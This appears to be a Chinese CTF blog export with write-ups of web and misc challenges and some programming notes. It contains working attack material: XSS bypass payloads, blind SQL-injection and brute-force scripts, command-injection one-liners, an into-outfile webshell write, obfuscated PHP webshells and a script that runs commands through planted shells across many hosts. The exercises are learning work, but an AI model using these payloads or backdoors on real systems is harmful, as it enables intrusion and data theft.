src=javascript:alert(1)&gt;level6过滤了很多字符，&lt;script 转换成 &lt;scr_ipt ，on 转换成 o_n ，src 转换成 sr_c ， data 转换成 da_ta，href 转换成 hr_ef，发现这里没有大小写约束， 我们可以构造payload: &gt; &lt;Script&gt;alert(1)&lt;/script&gt; // onerror:当在文件加载期间发生错误时运行的脚本。 &quot;&gt; &lt;img Src=x OnError=alert(1)&gt; // &quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;bmjoker&lt;/a&gt;// &quot;&gt;&lt;svg x=&quot; &quot; Onclick=alert(1)&gt; &quot;&gt;&lt;ScriPt&gt;alert(1)&lt;sCrIpt&gt;&quot; &quot; OncliCk=alert(1) //level7使用script标签，发现被替换成空了，则双写绕过 &quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;//level8]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SCUCTFwp]]></title>
    <url>%2F2019%2F01%2F03%2FSCUCTFwp%2F</url>
    <content type="text"><![CDATA[这两天做了SCUCTF平台上的web题，发现有很多问题，先在此记录下，等度过期末考试再好好去解决 先写一下自己能做出来的题(一部分)的wp。。 计算器 手速问题，用python的eval即可算出计算结果；再用session请求二十次即可 查看源代码发现数字和符号出现的地方有点乱。。而且每次刷新运算的个数和符号都很随机，因此用了正则匹配来得到运算元素 脚本： 1234567891011121314151617181920import requestsimport reimport timeurl = 'http://120.78.66.77:81/'s = requests.session()for i in range(1,21): req = s.get(url).text lists = re.findall('&lt;div.*?&gt;(.*?)&lt;/div&gt;',req,re.M) #获取匹配到的所有内容,返回的为列表 #.*?非贪婪匹配；使用()会返回()里面的内容；re.M多行匹配 exp = '' for i in lists: exp+=i exp = exp.replace('=','') #去掉最后的'='，以便使用eval运算 result = eval(exp) data = &#123;'ans':'%d'%result&#125; time.sleep(1) #不能运行太快 final = s.post(url,data) print(final.text) 登录一下 查看源代码，发现提示： hint:数据库中密码字段名为pwd，且只有一个用户名为admin的用户-前段时间刚好在学sql过滤一些关键字后怎样注入，还是能很轻松的写出脚本滴2333 过滤内容(一部分)： 空格 substr mid from and or select把substr、mid给过滤了，不过可以使用right(str,lenth)这个函数，返回从右开始长度为length的字符串 脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsurl = 'http://120.78.66.77:84/fb69d7b4467e33c71b0153e62f7e2bf0/'# 数据库名长度for i in range(1,100): payload = "0'or(length(database())=%d)#" % i data = &#123;'uname':'%s' % payload,'pwd':'asdf'&#125; req = requests.post(url,data) if 'error' in req.text: print("数据库名长度为: " ,i) break# 数据库名for k in reversed(range(1,4)): for i in range(32,127): payload = "0'or(ascii(right(database(),%d))=%d)#" % (k,i) data = &#123;'uname':'%s' % payload,'pwd':'asdf'&#125; req = requests.post(url,data) if 'error' in req.text: print(chr(i)) breakprint('over')# 密码长度for i in range(1,100): payload = "0'or(length(pwd)=%d)#" % i data = &#123;'uname':'%s' % payload,'pwd':'asdf'&#125; req = requests.post(url,data) if 'error' in req.text: print("密码长度为: " ,i) breakprint('over')# 密码for k in reversed(range(1,31)): for i in range(32,127): payload = "0'or(ascii(right(pwd,%d))=%d)#" % (k,i) data = &#123;'uname':'%s' % payload,'pwd':'asdf'&#125; req = requests.post(url,data) if 'error' in req.text: print(chr(i), end='') breakprint('over') 一款船细的外部题目 查看源代码 发现有提示，进入到info.php 页面显示这个页面被删了，则查看info.php.bak(备份文件) 发现下载了下来，打开发现是字典， 则可以进行爆破；虽然登录的页面把按钮隐藏了，但可以按enter进入，会返回 开始用那bak文件中的一百多个用户名爆破，爆了n个小时还是不行，而且脚本总是与主机断开连接。。之后想起来提示中的名字God sun ，就想着用名字中含有sun的，一试果然成功了 脚本： 123456789101112131415161718192021222324252627import requestsurl = 'http://120.78.66.77:88/uploadprocess.php/'a = ['sunyq']for i in a: for k in range(1900,2001): # 年 for w in range(1,13): # 月 if w&lt;10: w = str(w) w = '0'+w else: w = str(w) k = str(k) username = i password = k+i+w data = &#123;'username':'%s'%username,'password':'%s'%password&#125; req = requests.post(url,data) if 'simple' not in req.text: print(data) print(req.text) break print('运行的名字： ',i) print()print('结束运行') 运行结果： {&apos;username&apos;: &apos;sunyq&apos;, &apos;password&apos;: &apos;1926sunyq08&apos;} Oh My God! You are a smart boy!&lt;br&gt;&lt;a href=&apos;f1I3.php&apos;/&gt;God Huang&apos;s Small secret&lt;/a&gt;登录之后，是个文件上传的页面 不过上传php文件不行，改用后缀为.phps的文件后成功上传 phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码cat?这道题没法做。。端口出问题了。。不过记住方法吧 类型为命令注入 Linux下的命令注入： ping 1.1.1.1 &amp;&amp; cat flag #先执行ping后执行cat flag ping 1.1.1.1 | cat flag #只执行cat flag ping 1.1.1.1 &amp; cat flag #先执行cat flag后执行ping或者使用分号;一次执行两条语句： ping 1.1.1.1;cat flag ping 1.1.1.1;tac flag ...一些显示文件内容的方法： cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的显示文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号这真的不是XSS 查看源代码： 即将变量asdfghjkl的值进行rot13加密即可得到flag 这可能是XSS看着和上一题很像，但源代码不一样： 不是很懂。。。直接输入 &lt;script&gt;getFlag()&lt;/script&gt;在下面的输出框出现了flag Tor-Ex 点击后进入了hint1.php页面，查看源代码，发现有这样的提示： Do you know &quot;GET&quot; method ?&lt;br&gt; Please let me know who is the &quot;author&quot;.还发现 &lt; title &gt;1 of 8&lt; /title &gt;将hint1.php改为hint2.php发现有这个页面，则应该有hint1到hint8这几个意思，写脚本跑出所有内容： 1234567891011import requestsimport refor i in range(1, 9): url = 'http://120.78.66.77:15000/Tor-Ex/hint' url = url + str(i) + '.php' res = requests.get(url).text # print(res) data = re.findall('&lt;body.*?(.*?)&lt;/body&gt;',res, re.S)[0] print(i, end='') print(data) 跑出来一堆具有迷惑性的内容。。。。。。 后来在主页面找到了隐藏的提示 &lt; meta name=&quot;author&quot; content=&quot;TCPSoft&quot; &gt;则在hint1.php进行get提交 hint1.php?author=TCPSoft得到flag]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C++文件读写]]></title>
    <url>%2F2018%2F12%2F27%2FC-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%88%B0%E7%BB%93%E6%9E%84%E4%BD%93%2F</url>
    <content type="text"><![CDATA[最近做课设，需要从文件中读取数据，存储到结构体；大一没有认真学C++。。。 在此记录下C++对文件读写的操作 路径问题filename = &apos;C:/test/test.txt&apos;或 filename = &apos;C:\\test\\test.txt&apos;方式:#include &lt;fstream&gt; ofstream //文件写操作 内存写入存储设备 ifstream //文件读操作，存储设备读区到内存中 fstream //读写操作 打开文件可以用open()打开文件；也可以直接使用流对象 打开文件的方式在ios类(所以流式I/O的基类)中定义，有如下几种方式： ios::in 为输入(读)而打开文件 ios::out 为输出(写)而打开文件 ios::ate 初始位置：文件尾 ios::app 所有输出附加在文件末尾 ios::trunc 如果文件已存在则先删除该文件 ios::binary 二进制方式关闭文件close() 将数据读取到结构体中代码： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;using namespace std;#define MAX_NUM 20struct&#123; string num; //编号 string name; //名称 int price; //单价 int count; //销售数量 int sale; //销售额&#125;medicine[MAX_NUM];int main()&#123; int n = 0; ifstream in("C:\\Users\\腾飞\\Desktop\\info.txt", ios::in); //以读取方式打开文件 if (!in.is_open()) &#123; cout &lt;&lt; "Error" &lt;&lt; endl; return -1; &#125; while (!in.eof() &amp;&amp; n &lt; MAX_NUM) //eof：到达文件末尾返回true &#123; in &gt;&gt; medicine[n].num &gt;&gt; medicine[n].name &gt;&gt; medicine[n].price &gt;&gt; medicine[n].count &gt;&gt; medicine[n].sale; //从文件输入数值到结构体 //若要从结构体写入文件，则需用ofstream(或fstream)打开，然后操作符用 &lt;&lt; 即可 n++; &#125; for (int i = 0; i &lt; n; ++i) &#123; cout &lt;&lt; medicine[i].num &lt;&lt; " " &lt;&lt; medicine[i].name &lt;&lt; " " &lt;&lt; medicine[i].price &lt;&lt; " " &lt;&lt; medicine[i].count &lt;&lt; " " &lt;&lt; medicine[i].sale &lt;&lt; endl; &#125; in.close(); system("pause"); return 0;&#125; txt文件： 程序运行结果： 参考： C++文件读写详解 其他做课设时，有个问题是修改图的路径，开始用数组的方法，不过修改不成功；后来想到了将数据文件读取到结构体的方法，修改时只需修改结构体，然后写入到原文件，再读取原文件，这样即完成了修改]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python列表分块]]></title>
    <url>%2F2018%2F12%2F26%2Fpython%E5%88%97%E8%A1%A8%E5%88%86%E5%9D%97%2F</url>
    <content type="text"><![CDATA[一个列表将其中的元素平均分成多个列表 n = 5 #平均分成5个 print([new_list[i:i + n] for i in range(0, len(new_list), n)])]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2018-12中原工学院校赛wp]]></title>
    <url>%2F2018%2F12%2F23%2F2018-12%E4%B8%AD%E5%8E%9F%E5%B7%A5%E5%AD%A6%E9%99%A2%E6%A0%A1%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[签到题开始用御剑扫，不过没发现；然后查看请求头发现有提示，进去是代码审计，考察strcmp数组漏洞，构造repo[]=1获得flag 惊鸿一笔，上官婉儿这道题由于是报错型注入，而且flag是数据库名的md5加密，直接构造 ?id=asdf()原理就是使用数据库不存在的函数会将数据库名报错出来 快一点若直接post传入中间的数值，则会sleep这些秒；使用科学计数法，传入 6e6sleep 6秒就会出现flag 还可以传入数字的16进制，sleep无法生效 adminbugku上几乎一样的题；使用php://input绕过file_get_content，使用php://filter读取文件，读取class.php,但根据提示读取不到flag.php尝试读取index.php；之后利用序列化反序列化知识。 中工图书馆这道题没想到，以为图片上的就是flag，试了几次没试对，看了wp才发现是rot13加密。。 qebcf{nfqs25kjps8rjsi8kfqnfp42kizaoip}解密后 drops{asdf25xwcf8ewfv8xsdasc42xvmnbvc}]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[路由与交换技术]]></title>
    <url>%2F2018%2F12%2F14%2F%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[把书上的一些知识放到博客上 连接线交叉线： 路由器与路由器，路由器与计算机，计算机与计算机，交换机与交换机直连线： 路由器与交换机，计算机与交换机 ip地址及协议1.静态路由 config模式： ip route 目标网段 子网掩码 入口ip地址 (目标网段是与本路由器不直接相连的网络)2.RIP config模式： router rip version 2 network 网段 (网段是与本路由器直接相连的网络)3.OSPF config模式： router ospf 1 network 网段 反向掩码 area 0 (网段是与本路由器直接相连的网络)交换机VLANVLAN配置1.创建VLAN en模式： vlan database vlan 编号 (编号为2-1001之间)2.交换机某端口连接计算机，配置access模式 config模式： inter 端口 switchport mode access switchport access vlan 编号3.交换机某端口连接另一台交换机或路由器，配置trunk模式(二层交换机) config模式： inter 端口 switchport mode trunkvtp配置1.vtp enable模式： vlan database vtp domain 域名(abc) vtp client/server //设置客户端或服务端 vtp password 1234562.配置好服务端客户端后，在服务端创建的VLAN可直接在客户端使用 单臂路由的配置1.对交换机配置两个接口配置access模式，VLAN10允许PC0通过，VLAN20允许PC1通过；一个接口由于连接路由，则配置trunk模式 2.对计算机配置PC0： ip地址 192.168.10.1 255.255.255.0 默认网关 192.168.10.254PC1： ip地址 192.168.20.1 255.255.255.0 默认网关 192.168.20.254 3.对路由器进行子接口配置ip地址 inter f0/0 no shut inter f0/0.1 encapsulation dot1q 10 ip add 192.168.10.254 255.255.255.0 inter f0/0.2 encapsulation dot1q 20 ip add 192.168.20.254 255.255.255.0三层交换机实现VLAN间通信1.三层交换机配置 vlan database vlan 10 vlan 20 conf t inter vlan 10 //给VLAN10配置ip地址 ip add 192.168.10.254 255.255.255.0 inter vlan 20 //给VLAN20配置ip地址 ip add 192.168.20.254 255.255.255.0 inter f0/1 switchport trunk encapsulation dot1q //三层交换机配置trunk需进行封装协议 switchport mode trunk switchport trunk allowed vlan 10 //只允许VLAN10通过 inter f0/2 switchport trunk encapsulation dot1q switchport mode trunk switchport trunk allowed vlan 20 //只允许VLAN20通过打开三层交换机路由功能 ip routing (config模式)DHCPconfig模式 ip dhcp pool v10 //创建v10地址池 network 192.168.10.0 255.255.255.0 //设置地址段 default-router 192.168.10.254 //设置网关 dns-server 61.128.114.166 //设置DNS服务器地址ACL1.标准ACL config模式 access-list 表号 permit/deny 网段 反向掩码 //表号为1-99每个访问列表最后隐含有一条 deny any 的语句;可以在最后设置 access-list 1 permit any使其失效 应用ACL： inter f0/1 ip access-group 1 in/out2.扩展的ACL access-list 表号 permit/deny 协议 源网段 反向掩码 关系 源端口 目标网段 反向掩码 关系 目标端口]]></content>
      <categories>
        <category>路由</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[第二届郑州高校网络技能大赛wp]]></title>
    <url>%2F2018%2F12%2F08%2F%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%83%91%E5%B7%9E%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[第一次参加awd攻防赛，和其他高校的大佬一起比赛，感觉到自己好菜呜呜~ 规则就是要找出网站的漏洞，然后修复并且去攻击别人，攻击就是利用漏洞，然后拿到shell，执行一句话后就可以拿到flag 记录一下自己明白的漏洞… 靶机2018into outfile看到新闻上的 /index.php?action=view&amp;mod=detail&amp;id=5&apos; 时，就想着用sqlmap跑，跑出来flag了，但是一试其他队伍的，发现跑出来的flag都他喵一模一样;后来知道，可以使用into outfile将一句话木马写入文件 /index.php?action=view&amp;mod=detail&amp;id=5 union select 1, &apos;&lt;?php phpinfo();?&gt;&apos;,1,1,1,1,1 from z_users limit 1 into outfile &apos;/var/www/html/images/1.php&apos; php的16进制绕过有一个文件： &lt;?php if(!isset($_GET[&apos;c&apos;])){ exit(); }else{ $c = $_GET[&apos;c&apos;]; if(!preg_match(&apos;/^\w+$/&apos;, $c)){ exit(&apos;hi!gemen!&apos;); }else{ $str = &apos;clur&apos;; $rand = str_shuffle($str); echo `$rand . &apos; &apos; . $c`; } } ?&gt;之后百度找正则匹配方面的漏洞，发现搜到的东西错误的地方真是太多。。。 表达式的格式： &quot;/表达式/[修正符]&quot; $表示行结尾，^表示行开始 \w 匹配英文字母、数字或下划线 str_shuffle()： 将字符随机打乱，当打乱成curl时即可执行语句拿到flag由于需要利用curl请求内部flag服务器10.0.1.2，则需使用ip的16进制进行请求获得flag。 金融JSPLinux中，所有用户的账号和密码都可以在/etc/passwd和/etc/shadow这两个文件中找到 通过： vi /etc/shadow查看，格式： 登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-come_game]]></title>
    <url>%2F2018%2F12%2F07%2FBugku-come-game%2F</url>
    <content type="text"><![CDATA[题目是一个游戏 游戏结束会出现一些文件，save1应该为存档 使用010打开save1 2对应第二关，修改为5 进入游戏选择Load game]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python遍历文件目录]]></title>
    <url>%2F2018%2F12%2F05%2Fpython%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%2F</url>
    <content type="text"><![CDATA[python os.walk()使用 os.walk 的返回值是一个生成器(generator),也就是说我们需要不断的遍历它，来获得所有的内容。 每次遍历的对象都是返回的是一个三元组(root,dirs,files) root 所指的是当前正在遍历的这个文件夹的本身的地址，即等于path dirs 是一个 list ，内容是该文件夹中所有的目录的名字(不包括子目录) files 同样是 list , 内容是该文件夹中所有的文件(不包括子目录)文件test中： test1 hello.txt test2 asdf.txt 1.txt 2.txt代码： import os path = &apos;test&apos; for root, dirs, files in os.walk(path): for file in files: print(file)结果： 1.txt 2.txt hello.txt asdf.txt获取路径名+文件名： os.path.join(root, file)检测文件是否以指定后缀结尾，可以使用endswith()，若含有返回ture，否则false]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[AWD网络攻防]]></title>
    <url>%2F2018%2F12%2F03%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%2F</url>
    <content type="text"><![CDATA[学习攻防，记录学习过程 连接主机，下载源码得到ip地址，打开winscp，将ip填入主机名，点击登录；然后输入用户名密码，连接成功 连接好后就可以上传、下载、删除linux服务器文件 要备份至少三份HTML文件 在Windows浏览器输入linux ip地址即可访问网站； 修改ssh密码用xshell连接上后台，打开终端输入 passwd然后输入新密码即可 扫后门将备份目录拖到D盾这个工具中扫描，看看是否留有后门 可以右键查看文件内容 发现有后门要立刻删除，并且利用这个后门攻击其他服务器 扫描其他队伍ip及端口可以扫描发现其他队伍的ip 扫描局域网内存活主机 nmap -sP 192.168.0.0/24扫描端口 nmap -sS -p 1-65535 -v 192.168.xx 指定1-65535端口扫描，-v显示详细信息数据库一般在ip后输入/admin能跳转到后台登录的页面 如果不知道后台登录的密码，可以从数据库里面查找 用xshell连接后台，打开终端，然后切换到 /var/www/html输入 mysql -uroot -p回车输入数据库密码。密码从后台文件data/config.php里面找 之后进行查询，找到的密码被md5加密了，就解密一下即可登录管理后台，如果为弱密码，则要及时更改 木马利用一句话木马若存有一句话木马，可直接用python脚本跑出其他ip的flag文件，不必使用菜刀一个个连接其他ip去找flag文件 import requests url = &quot;http://192.168.159.&quot; # 可变，ip地址网段 shell = &quot;/upload/img/201808152140042358.php&quot; # 可变，一句话木马文件所在目录 passwd = &quot;1&quot; # 可变，一句话木马密码 port = &quot;80&quot; # 可变，端口号 payload = {passwd: &quot;system(&apos;cat firstround_flag.txt&apos;);&quot;} # 可变，改为flag所在文件名及目录 for i in [131, 145, 146, 147]: # 可变，其他ip地址 url1 = url + str(i) + &quot;:&quot; + port + shell try: res = requests.post(url1, payload, timeout=1) if res.status_code == requests.codes.ok: print(url1 + &quot; connect shell success,flag is &quot; + res.text) else: print(&quot;shell 404&quot;) except Exception as e: print(url1+&quot; connect shell fail&quot;)非常规一句话木马一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数 1. &lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：?2=assert 密码：12. &lt;?php $a=chr(96^5); $b=chr(57^79); $c=chr(15^110); $d=chr(58^86); $e=&apos;($_REQUEST[C])&apos;; @assert($a.$b.$c.$d.$e); ?&gt; 连接方式：?b=))99(rhC(tseuqeR+lave3. &lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]); $s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&apos;n985de9&apos;]; if(isset($s22)) { eval($s21($s22)); } ?&gt; 连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0部署waf将waf上传到服务器，在需要部署waf的文件中加上 include(&apos;waf.php&apos;)如果在index.php中以及部署了waf，可以在终端运行 php index.php查看是否部署成功，如果失败会报错 部署文件监控打开xshell这个工具，这个工具就是远程终端模拟系统 连接上ip后可以执行linux指令 查看python版本： python --version上传文件监控脚本到服务器，然后在xshell中运行 cd /var/www/html python file_check2.py就可以了 挖漏洞使用SQLmap看到疑似SQL注入的漏洞可以扫描一下]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-linux]]></title>
    <url>%2F2018%2F12%2F03%2FBugku-linux%2F</url>
    <content type="text"><![CDATA[题目是一个.tar文件 tar （Linux系统命令） Unix和类Unix系统上的压缩打包工具，可以将多个文件合并为一个文件，打包后的文件名亦 为“tar”。 本程序最初的设计目的是将文件备份到磁带上（tape archive），因而得名tar。tar代表未压缩的tar文件。已压缩的tar文件则附加压缩文件的扩展名，如经过gzip压缩后的tar文件，扩展名为“.tar.gz”。由于受到DOS8.3文件名格式的限制，常使用下列缩写： .tgz等价于.tar.gz .tbz与tb2等价于.tar.bz2 .taz等价于.tar.Z .tlz等价于.tar.lzma .txz等价于.tar.xz将文件放到虚拟机里面，打开里面有一个flag文件，用终端进行搜索文件里面的内容 Linux grep命令用于查找文件里符合条件的字符串。 grep指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样 式，预设grep指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文 件名为&quot;-&quot;，则grep指令会从标准输入设备读取数据。参数： -a 或 --text : 不要忽略二进制的数据。切换进入到flag同级目录，输入 grep -a &apos;{&apos; flag得到flag]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[闪的好快]]></title>
    <url>%2F2018%2F12%2F02%2F%E9%97%AA%E7%9A%84%E5%A5%BD%E5%BF%AB%2F</url>
    <content type="text"><![CDATA[题目是一张动态二维码，每次用手机扫都得到不同的字符 上网了解到可以用stegsolve这个工具一帧一帧的查看gif图片；使用需要先配置好java环境变量 打开图片后选择Frame Browser即可查看；要缩小软件才能查看下/上一张图片； 手机扫码得到flag]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多种方法解决]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[下载好文件，是一个.exe文件，但是打不开，于是用010editor查看 这些是Data URI scheme Data URI scheme是在RFC2397中定义的，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。比如上面那串字符，其实是一张图片，将这些字符复制黏贴到谷歌的地址栏中并转到，就能看到它了 在上面的Data URI中，data表示取得数据的协定名称，image/jpg 是数据类型名称，base64 是数据的编码方法，逗号后面就是这个image/jpg文件base64编码后的数据 目前，Data URI scheme支持的类型有： data:,文本数据 data:text/plain,文本数据 data:text/html,HTML代码 data:text/html;base64,base64编码的HTML代码 data:text/css,CSS代码 data:text/css;base64,base64编码的CSS代码 data:text/javascript,Javascript代码 data:text/javascript;base64,base64编码的Javascript代码 data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据在PHP中可以用函数base64_encode() 进行编码，如 echo base64_encode(file_get_contents(‘wg.png’));网页中一张图片可以这样显示： &lt;img src=“http://www.xxx.com/images/wg.png”/&gt;也可以这样显示： &lt;img src=“data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAkC...&gt;把图像文件的内容直接写在了HTML文件中，这样做的好处是，节省了一个HTTP 请求。坏处就是浏览器不会缓存这种图像 则将代码复制到浏览器回车，得到二维码，扫码得到flag]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-啊哒]]></title>
    <url>%2F2018%2F12%2F02%2FBugku-%E5%95%8A%E5%93%92%2F</url>
    <content type="text"><![CDATA[题目是一张图片 放到010editor，发现后面有flag.txt这个字符串 然后用foremost分离一下，得到一张图片和一个压缩包文件，打开压缩文件，但是解压需要密码 查看图片的属性，发现有个照相机型号，进行16进制解码，得到 sdnisc_2018 ，然后解压，得到flag 之后搜了一下，发现文件解压密码只能够暴力破解。。。]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-隐写]]></title>
    <url>%2F2018%2F12%2F02%2FBugku-%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[题目下载好打开是一张图片 开始以为是两种不同的文件结合在一起，然后下载了foremost工具试着分离，结果分离后还是这一张图片 从网上找到了相关的知识，原来需要改变图片的宽度 （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH） （可变）13位数据块（IHDR) 前四个字节代表该图片的宽 后四个字节代表该图片的高 后五个字节依次为： Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。用010editor打开，则00 00 01 F4代表宽，00 00 01 A4代表高 查看图片属性 则将高改为宽一样的像素，即将A4改为F4 关于隐写bugku上其他隐写的题目也很多，可用foremost工具分离；使用命令 foremost xx.jpg也可以在binary目录新建一个xx.bat文件，写入cmd，点击后即可cd到当前目录 使用cmd可以自己将文件隐写，执行 copy 1.jpg/b+2.jpg new.jpg生成的new.jpg即为隐写之后的文件]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-INSERT INTO注入]]></title>
    <url>%2F2018%2F12%2F02%2FBugku-INSERT-INTO%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目： flag格式：flag{xxxxxxxxxxxx} 不如写个Python吧 error_reporting(0); function getIp(){ $ip = &apos;&apos;; if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])){ $ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]; }else{ $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; } $ip_arr = explode(&apos;,&apos;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &apos;your ip is :&apos;.$ip; $sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;; mysql_query($sql);相关函数： $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] XFF头 $_SERVER[&apos;REMOTE_ADDR&apos;] 用户正在查看当前页面的IP地址 explode(separator,string,limit) separator 必需。规定在哪里分割字符串。 string 必需。要分割的字符串。题目没有报错，可以通过时间盲注来做，而且需要注意： 1.$ip_arr = explode(&apos;,&apos;, $ip); 这句话意思就是构造的注入语句不能有逗号&apos;,&apos;，不然只会查询第一个逗号前的值 2.sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;; 构造的XFF头不能为 1&apos;)and sleep(5)# 这种格式，而是应该为 1&apos; and sleep(5))# 这种格式脚本： import requests url = &apos;http://123.206.87.240:8002/web15/&apos; for i in range(30): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when length(database())=%d then sleep(5) else 0 end)#&quot;%i} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: print(i) print(&apos;gg&apos;) break print(&apos;over&apos;) name = &apos;&apos; for position in range(1,6): for num in range(0,128): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when ascii(substr((database()) from %d))=%d then sleep(5) else 0 end)#&quot;%(position,num)} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: name += chr(num) print(chr(num),end=&apos;&apos;) break print() print(name) print(&apos;over&apos;) for i in range(100): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when length((select group_concat(table_name) from information_schema.tables where table_schema=(select database())))=%d then sleep(5) else 0 end)#&quot;%i} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: print(i) print(&apos;gg&apos;) break print(&apos;over&apos;) name = &apos;&apos; for position in range(1,15): for num in range(0,128): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=(select database()))from %d))=%d then sleep(5) else 0 end)#&quot;%(position,num)} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: name += chr(num) print(chr(num),end=&apos;&apos;) break print() print(name) print(&apos;over&apos;) for i in range(100): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when length((select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;))=%d then sleep(5) else 0 end)#&quot;%i} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: print(i) print(&apos;gg&apos;) break print(&apos;over&apos;) name = &apos;&apos; for position in range(1,5): for num in range(0,128): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;) from %d))=%d then sleep(5) else 0 end)#&quot;%(position,num)} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: name += chr(num) print(chr(num),end=&apos;&apos;) break print() print(name) print(&apos;over&apos;) name = &apos;&apos; for position in range(1,100): for num in range(0,128): headers = {&apos;X-Forwarded-For&apos;:&quot;1&apos;and case when ascii(substr((select flag from flag) from %d))=%d then sleep(5) else 0 end)#&quot;%(position,num)} try: req = requests.post(url,headers=headers,timeout=4) except Exception as e: name += chr(num) print(chr(num),end=&apos;&apos;) break print() print(name) print(&apos;over&apos;)]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件泄露漏洞]]></title>
    <url>%2F2018%2F11%2F27%2F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%2F</url>
